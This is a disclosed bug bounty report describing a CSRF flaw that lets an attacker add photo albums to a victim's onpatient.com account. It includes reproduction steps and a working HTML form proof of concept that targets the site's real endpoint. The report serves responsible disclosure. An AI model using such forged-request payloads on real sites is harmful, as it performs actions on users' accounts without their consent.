# CSRF  Add Album On  onpatient.com 

## Report Details
- **Report ID**: 99647
- **URL**: https://hackerone.com/reports/99647
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2015-11-14T12:15:29.158Z
- **Disclosed**: 2016-08-31T04:44:13.907Z

## Reporter
- **Username**: hussain_0x3c
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: drchrono

## Vulnerability Information
**Hi**

I'm  Found  Bug CSRF It is Possible To Add  Album  By Attacker on onpatient.com 

Steps to verify
----
* . Login as attacker 
* . Go to  photos and  click  **add album**
* . rename  album for example :- **hacking** . 
* . intercept this request add using burp proxy or any other tool  (you can see **X-CSRFToken**  and  **sessionid**)  attacker can add request  on post  without  **X-CSRFToken**
* . Create  Form HTML  Exploit   **Add album**
* . Send to **Victim User**

Form Exploitation 
---
~~~
<html>
<body>
<form action="https://onpatient.com/photos/add_album/" method="POST">
<input type="hidden" name="name" value="hacking" />
<input type="submit" value="Add album Hacking" />
</form>
</body>
</html>
~~~
**Response** :- {"album": idalbum, "success": true} 




**Regards**
**Hussain**



## Attachments
- form-csrf.html
